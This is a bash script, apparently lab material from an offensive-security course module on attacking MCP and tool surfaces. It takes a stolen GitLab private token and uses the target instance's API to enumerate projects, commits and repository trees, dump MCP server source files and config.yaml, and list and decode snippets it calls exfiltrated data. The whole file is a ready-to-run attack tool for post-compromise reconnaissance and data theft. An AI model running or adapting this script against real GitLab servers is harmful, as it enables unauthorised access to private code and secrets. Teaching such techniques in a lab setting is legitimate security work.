#!/bin/bash
"""
Script: gitlab_enum.sh
Module: 07 — Attacking MCP and Tool Surfaces
Purpose: Enumerate GitLab repositories, commits, and read server source files using a stolen token
Usage: ./gitlab_enum.sh GITLAB_IP TOKEN [PROJECT_ID]
Target: GitLab CE/EE instance (default project ID 1)
"""

GITLAB_IP="${1:?Usage: $0 GITLAB_IP TOKEN [PROJECT_ID]}"
TOKEN="${2:?Missing TOKEN}"
PROJECT="${3:-1}"
BASE="http://${GITLAB_IP}/api/v4"

echo "[*] Enumerating projects..."
curl -s -H "PRIVATE-TOKEN: ${TOKEN}" \
  "${BASE}/projects?per_page=100" \
  | python3 -c "
import sys, json
for p in json.load(sys.stdin):
    print(f'{p[\"id\"]:4d}  {p[\"path_with_namespace\"]}')
"

echo ""
echo "[*] Recent commits for project ${PROJECT}..."
curl -s -H "PRIVATE-TOKEN: ${TOKEN}" \
  "${BASE}/projects/${PROJECT}/repository/commits?per_page=5" \
  | python3 -c "
import sys, json
for c in json.load(sys.stdin):
    print(c['id'][:8], c['author_name'], c['message'][:60])
"

echo ""
echo "[*] Repository file tree..."
curl -s -H "PRIVATE-TOKEN: ${TOKEN}" \
  "${BASE}/projects/${PROJECT}/repository/tree?recursive=true&per_page=100" \
  | python3 -c "
import sys, json
for f in json.load(sys.stdin):
    print(f['path'])
"

echo ""
echo "[*] Reading server source files..."
for f in "servers/filesystem_mcp.py" "servers/database_mcp.py" "servers/code_review.py" "servers/slack_notify.py" "config.yaml"; do
    echo ""
    echo "========== ${f} =========="
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${f}', safe=''))")
    curl -s -H "PRIVATE-TOKEN: ${TOKEN}" \
        "${BASE}/projects/${PROJECT}/repository/files/${ENCODED}/raw?ref=main"
done

echo ""
echo "[*] Checking for GitLab snippets (exfiltrated data)..."
curl -s -H "PRIVATE-TOKEN: ${TOKEN}" "${BASE}/snippets" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
if not data:
    print('[-] No snippets found')
else:
    for s in data:
        print(f'{s[\"id\"]:4d}  {s[\"title\"]}')
    print()
    print('[!] To decode a snippet:')
    print(f'    curl -s -H \"PRIVATE-TOKEN: TOKEN\" {\"http://\" + sys.argv[1] if len(sys.argv)>1 else \"http://GITLAB\"}/api/v4/snippets/ID/raw | base64 -d')
"
